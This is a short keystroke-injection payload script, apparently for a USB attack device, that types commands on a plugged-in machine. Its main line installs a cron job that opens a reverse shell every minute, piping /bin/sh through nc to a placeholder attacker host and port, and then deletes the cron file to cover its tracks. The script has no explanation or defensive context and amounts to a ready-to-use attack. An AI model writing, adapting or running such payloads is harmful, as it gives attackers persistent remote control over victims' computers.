LHOST="<LHOST>"
LPORT=<LPORT>
crontab_file="/tmp/$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)"

ATTACKMODE HID
LED R
QUACK DELAY 2500
QUACK GUI
QUACK DELAY 500
QUACK STRING cmd
QUACK DELAY 500
QUACK ENTER
QUACK DELAY 500
QUACK STRING "echo '* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f' > $crontab_file && crontab $crontab_file && rm $crontab_file && exit"
QUACK ENTER
QUACK STRING exit
LED G
